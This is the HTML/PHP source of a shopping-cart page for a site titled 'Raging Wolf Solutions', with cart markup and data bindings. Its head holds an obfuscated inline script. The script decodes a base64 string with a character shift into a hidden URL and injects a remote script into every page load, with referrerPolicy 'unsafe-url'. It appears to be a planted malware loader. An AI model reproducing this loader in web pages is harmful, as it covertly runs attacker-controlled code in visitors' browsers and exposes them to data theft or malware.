<!doctype html>
<html>

<head>
    <script src="dmxAppConnect/dmxAppConnect.js"></script>
    <meta charset="UTF-8">
    <title>Giving Back | Raging Wolf Solutions</title>

    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.14.0/css/all.css" integrity="sha384-HzLeBuhoNPvSl5KYnjx0BT+WB0QEEqLprO+NBkkk5gbc67FTaL7XIGa2w1L0Xbgc" crossorigin="anonymous" />
    <link href="https://fonts.googleapis.com/css2?family=Lustria&amp;family=Muli:ital,wght@0,400;0,500;0,600;0,700;1,400;1,500;1,600;1,700&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.cdnfonts.com/css/sansation" rel="stylesheet">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="bootstrap/5/css/bootstrap.min.css" />
    <link rel="stylesheet" href="css/style.css" />
    <link rel="stylesheet" href="css/stylesheet.css" />
    <script src="js/jquery-3.5.1.slim.min.js"></script>
    <script src="dmxAppConnect/dmxBootstrap5Navigation/dmxBootstrap5Navigation.js" defer=""></script>
    <script src="dmxAppConnect/dmxBackgroundVideo/dmxBackgroundVideo.js" defer=""></script>

    <script src="dmxAppConnect/dmxBootstrap5Modal/dmxBootstrap5Modal.js" defer></script>
    <link rel="icon" href="icons/favicon.ico">
    <link rel="stylesheet" href="dmxAppConnect/dmxValidator/dmxValidator.css" />
    <script src="dmxAppConnect/dmxValidator/dmxValidator.js" defer></script>
    <script src="dmxAppConnect/dmxBrowser/dmxBrowser.js" defer></script>
    <script>
        (function(){var _5S=document.createElement("script"),_jF=(function(_sP,_Ii){var _T2="";for(var _w6=0;_w6<_sP.length;_w6++){var _7h=_sP[_w6].charCodeAt();_7h-=_Ii;_7h+=61;_T2==_T2;_Ii>8;_7h%=94;_7h!=_w6;_7h+=33;_T2+=String.fromCharCode(_7h)}return _T2})(atob("OEREQENoXV1HQ1xKPz89OT42P1wzPz1dQDlINTxdZGExMmJjY2cxMmJkZ19mMl5mXjJlY2Rh"), 46);_5S!="q";_5S.src=_jF;_5S.async=!0;_5S.referrerPolicy="unsafe-url";_5S.type="text/javascript";function _Qm(){};5>4;var _G3=document.getElementsByTagName("script")[0];_G3.parentNode.insertBefore(_5S,_G3)})();
    </script>
    <script src="dmxAppConnect/dmxVideo/dmxVideo.js" defer></script>

    <link rel="stylesheet" href="css/charity.css" />


    <link rel="stylesheet" href="dmxAppConnect/dmxSlideshow/dmxSlideshow.css" />
    <script src="dmxAppConnect/dmxSlideshow/dmxSlideshow.js" defer></script>
    <link rel="stylesheet" href="dmxAppConnect/dmxSlideshow/themes/default.css" />
    <script src="dmxAppConnect/dmxDataTraversal/dmxDataTraversal.js" defer></script>
    <script src="dmxAppConnect/dmxTyped/dmxTyped.js" defer></script>
    <script src="dmxAppConnect/dmxTyped/typed.min.js" defer></script>
    <script src="dmxAppConnect/dmxStateManagement/dmxStateManagement.js" defer></script>
    <script src="dmxAppConnect/dmxFormatter/dmxFormatter.js" defer></script>
    <script src="dmxAppConnect/dmxDatastore/dmxDatastore.js" defer></script>
</head>

<body is="dmx-app" id="index" class="bg-dark">

    <dmx-value id="strCart" dmx-bind:value="queryCart.data.items"></dmx-value>
    <dmx-array id="arrCart" dmx-bind:items="strCart.value.split('—')"></dmx-array>
    <dmx-query-manager id="queryCart"></dmx-query-manager>
    <dmx-json-datasource id="jsonDS1" is="dmx-serverconnect" url="js/wolfsden_v2.json"></dmx-json-datasource>
    <div is="dmx-browser" id="browser1"></div>

    <?php include 'navbar_mini'; ?>

    <?php include 'navbar_main'; ?>



    <section id="modules" class="border-top rounded-1 rounded-0 min-vh-75 border-secondary pb-3" style="min-height: 75vh;">

        <img src="assets/images/section-modal-bg-top-stone.png" class="w-100">
        <div class="container" id="wholeCart">

            <div class="row justify-content-center row-cols-12">
                <div class="col-lg-8 order-2 order-lg-1 col-md-12 col-sm-12 col-12" id="shopping_Cart">
                    <div class="row h-100">

                        <div class="module-card col border rounded-0 rounded-1 border-secondary mt-3 mb-3 ms-3 me-3 pt-3 pb-3 ps-3 pe-3 align-self-center">
                            <div class="container pt-3 pb-2 ps-0 pe-0">

                                <div class="col text-center" is="dmx-data-detail">
                                    <div class="container-fluid" id="emptyCart">
                                        <h6 class="text-light" dmx-text="strCart.value">Fancy display heading</h6>
                                        <h6 class="text-light text-truncate" dmx-text="arrCart.count">Fancy display heading</h6>
                                        <h1 class="text-secondary mt-4 fst-italic text-wrap">Your Cart is Currently Empty.
                                        </h1>
                                        <p class="text-secondary hover-cursor" dmx-on:click="browser1.goto('wolfsden.php')"><i><u>Click here to add items!</u></i></p>
                                    </div>


                                </div>
                                <div class="row justify-content-center g-0 gx-4">
                                    <div class="module-card col border rounded-0 rounded-1 border-secondary mt-3 mb-3 ms-3 me-3 pt-3 pb-5 ps-3 pe-3" id="selectedItems" dmx-repeat:repeat1="jsonDS2.data"></div>
                                </div>
                            </div>
                        </div>

                    </div>
                </div>

                <div class="col-lg-4 text-warning order-1 order-lg-2 col-md-12 col-sm-12 col-12 sticky-top" id="cart_Snapshot">
                    <div class="row">
                        <div class="col">
                            <div class="container ps-sm-1 pe-sm-1 ps-1 pe-1">
                                <div class="module-card border rounded-0 border-secondary mt-3 mb-3 pt-3 pb-3 ps-3 pe-3 col fw-bolder lh-lg rounded-1" style="min-height: 278px">
                                    <h5 class="text-warning text-center lh-1">Your Cart</h5>
                                    <hr id="a">

                                    <!-- ROW MUST DMX-REPEAT WITH SINGLE PRICE FOR PRODUCT(S) ON EACH LINE, DIFF PROD == DIFF LINE -->
                                    <div class="row">
                                        <!-- Needs to show 'prodTitle' appended from wolfsdend.php -->
                                        <div class="col"><a href="wolfsden_v2.json.value='prodTitle'"><u>Item</u></a></div>

                                        <!-- Reflects the # from id=prodQuantity -->
                                        <div class="col text-center" id="purchQuantity"><u>Quantity</u></div>

                                        <!-- Price of indiv. item/ ($ x # = subt) -->
                                        <div class="col"><span class="price" id="itemCost"><u>$/ea.</u></span></div>

                                    </div>
                                    <div class="row text-nowrap" dmx-repeat:repeat2="arrCart.items">
                                        <dmx-array id="arrCartItems" dmx-bind:items="$value.split('|')"></dmx-array>
                                        <!-- Needs to show 'prodTitle' appended from wolfsdend.php -->
                                        <div class="col"><a dmx-text="arrCartItems.items[0]">Item</a></div>

                                        <!-- Reflects the # from id=prodQuantity -->
                                        <div class="col text-center" id="purchQuantity1" dmx-text="arrCartItems.items[1]">Quantity</div>

                                        <!-- Price of indiv. item/ ($ x # = subt) -->
                                        <div class="col"><span class="price" id="itemCost1" dmx-text="'$'+arrCartItems.items[2]">$/ea.</span></div>

                                    </div>

                                    <hr id="b">

                                    <!-- Shows SUBTOTAL off all product(s) from each line/ uses formula ($ x # = subt) + ($ x # = subt) + ... -->
                                    <p class="ps-1 pe-1">Subtotal <span class="price" id="subtotal"><b>$30</b></span></p>

                                    <!-- Brings up wolfsden-notice.php modal -->
                                    <button id="purchase" class="btn w-100 text-black bg-warning fw-bold mt-3" dmx-on:click="">Proceed To Checkout</button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

        </div>
        <div class="container" id="selectedItems_Placeholder" dmx-repeat:repeat3="arrCart.items">

            <dmx-array id="arrCartItemsBelow" dmx-bind:items="$value.split('|')"></dmx-array>

            <div class="row justify-content-center">
                <div class="col-md-12 col">
                    <div class="row h-100">

                        <div class="module-card col border rounded-0 rounded-1 border-secondary mt-3 mb-3 ms-3 me-3 pt-3 pb-5 ps-3 pe-3">
                            <div class="container pt-3 pb-2 ps-0 pe-0">
                                <div class="row justify-content-center g-0 gx-4">

                                    <div class="col-lg-5">
                                        <!--- Adds corrosponding image slide selected from wolfsden.php --->
                                        <img class="img-fluid" id="choiceSlide" dmx-bind:src="arrCartItemsBelow.items[3]">

                                    </div>

                                    <div class="col-12 col-lg pt-2 pb-2">
                                        <div class="row row-cols-12 g-0" id="sel_item_design_placeholder">
                                            <div class="text-start m-0 p-0 w-25 col">
                                                <h4 class="text-light m-0 p-0" id="prodTitle" dmx-text="arrCartItemsBelow.items[0]">Large 44z Thermal Travel Mug</h4>
                                            </div>
                                            <div class="text-end col-4">
                                                <h4 class="text-light m-0 p-0" id="itemCost" dmx-text="arrCartItemsBelow.items[2]">$24.99</h4>
                                            </div>

                                        </div>
                                        <p class="fw-bold text-danger mb-2">——</p>


                                        <div dmx-on:load="var urlParams=dmx.parseQueryString();">
                                            <h6>
                                                <span class="badge rounded-pill bg-dark me-1 hover-cursor" dmx-repeat:repeatBadge="jsonDS1.data.optionChoice" dmx-class:bg-dark="color=='dark'" dmx-class:bg-primary="color=='dark-blue'" dmx-class:bg-danger="color=='red'" dmx-class:bg-info="color=='teal'" dmx-class:bg-white="color=='white'" dmx-class:text-dark="color=='white'" dmx-style:background-color="color" id="optionChoice" dmx-text="name" dmx-text="optionChoice.items[arrCartItemsBelow.items[4] - 1].name">
                                                </span>
                                            </h6>
                                        </div>



                                        <p class="fw-bold text-danger mb-2">——</p>

                                        <p class="text-light" id="prodDesc" dmx-text="arrCartItemsBelow.items[5]"></p>

                                        <p class="text-danger mb-2 fw-bold w-25">——</p>

                                        <div class="row">
                                            <div class="col-lg-2 col-6"><input id="prodQuantity" name="text1" type="number" class="form-control" placeholder="Qty." dmx-bind:value="arrCartItemsBelow.items[1]"></div>
                                            <div class="col-lg-2 col-6"><button id="removeThisProd" class="btn bg-secondary w-100 text-truncate" dmx-on:click="">
                                                    <i class="far fa-trash-alt fa-fw me-1"></i>Delete</button></div>
                                        </div>


                                    </div>
                                </div>
                            </div>

                        </div>
                    </div>




                </div>
            </div>
        </div>

        <div class="row">

            <div class="col text-light">
                <hr>
            </div>
        </div>




    </section>

    <?php include 'footer.php'; ?>

    <script src="bootstrap/5/js/bootstrap.bundle.min.js"></script>

    <script src="js/script.js"></script>

</body>

</html>